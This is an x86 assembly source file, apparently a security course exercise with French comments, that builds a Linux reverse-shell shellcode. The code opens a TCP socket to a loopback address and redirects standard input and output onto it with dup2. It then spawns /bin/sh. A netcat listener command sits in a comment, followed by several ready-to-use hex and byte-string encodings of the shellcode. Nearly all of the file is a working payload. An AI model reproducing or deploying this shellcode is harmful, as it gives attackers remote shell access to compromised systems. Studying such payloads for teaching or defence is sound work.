; NOM / Prénom : NEHME Ali
; REVERSE SHELL ASM
; M1 - Sécurité - GR3
; ESGI
;


section .text
    global _start

# nc -l -p 3005 -s 127.1.1.1

_start:

    ; Xored IP
    push 0x101017f     ; IP  

    ; Xored port + AF_INET
    push word 0xbd0b ; pushw 0xbd0b
    ; push word 0x2    ; pushw 0x2


    ;; Création de la socket
    mov ax, 0x0167 ; socket 

    mov bl, 0x2 ; domaine : AF_INET (IPv4)

    push bx    ; pushw 0x2 (AF_INET)

    inc ecx ; type : SOCK_STREAM (TCP)

    xor edx, edx      ; protocole : The  protocol  specifies  a  particular  protocol to be used with the socket.  Normally only a single protocol exists to support a particular  socket type within a given protocol family, in which case protocol can be specified as 0.
    int 0x80

    ; On conserve la socket dans ebx
    mov ebx, eax
    ; push eax
    ; pop ebx


    ;; Connection à la victime + scan des ports
    ;; Permet de se connecter à une socket si trouvé.
    ;; Cette "fonction" permet aussi de scanner à partir 
    ;; du paramètre "TRY_TO_FIND_PORT", une intervalle de port 
    ;; commençant par "PORT_ADDR".
    mov ax, 0x16a  ; connect
    mov ecx, esp    ; Struct sockaddr *addr
    mov dl, 0x10   ; size de sockaddr *addr

    ; socket_fd (socket créé)
    ; push edi
    ; pop ebx  
    int 0x80


    add eax, 0x3
    mov ecx, eax


    ;; Dup2 (duplication)
    not_finish_dup:
    mov al, 0x3f    ; dup2
    ; mov ebx, edi    ; socket de la victime (connexion)
    dec ecx ; stdin - stdout - stderr
    int 0x80
    
    jnz not_finish_dup
    
    ; inc ecx
    mov al, 0x0b   ; execv
    ; /bin/sh\0
    push ecx
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    mov edx, ecx
    lea ebx, [esp]
    int 0x80

    ;; Exit avec un 0 (tout s'est bien passé)
    ; mov al, 1
    inc eax
    xor ebx, ebx
    int 0x80


;; 66686701586A025B6A01
;; 5931D2CD80505F66B86A
;; 01683927015B68462701
;; 015931D951683B270ABD 
;; 5931D95189E1B210575B
;; CD8031D289D16A3F5E89
;; F089FB89D1CD8089F041
;; CD8089F041CD805259BB
;; 51686E2F7368682F2F62
;; 698D1C24CD80B131DBCD
;; 80


;; 66686701586A025B6A01
;; 5931D2CD80505F66B86A
;; 016846270101683B270A
;; BD89E1B210575BCD8031
;; D289D16A3F5E89F089FB
;; 89D1CD8089F041CD8089
;; F041CD805259BB51686E
;; 2F7368682F2F62698D1C
;; 24CD80B131DBCD80



; \x68\x7f\x01\x01\x01\x5e\x66\x68\xd9\x03\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xce

;; 83 octets
;; 683927015BB846270101
;; 31D850B83B270ABD31D8
;; 50686701586A025B6A01
;; 5931D2CD80505B66B86A
;; 0189E1B210CD8083C289
;; C1B03FCD804979F94189
;; CABB51686E2F7368682F
;; 2F62698D1C24CD80B131
;; DBCD80

;; 77 octets
;; 687F01010166680BBD66
;; 6A02686701586A025B6A
;; 015931D2CD80505B66B8
;; 6A0189E1B210CD8083C0
;; 0289C1B03FCD804979F9
;; 4189CAB00B51686E2F73
;; 68682F2F62698D1C24CD
;; 80B00131DBCD80

;; 72 octets
;; 687F01010166680BBD66
;; B86701B30266534131D2
;; CD8089C366B86A0189E1
;; B210CD8083C00389C1B0
;; 3F49CD8075F9B00B5168
;; 6E2F7368682F2F626989
;; CA8D1C24CD804031DBCD
;; 80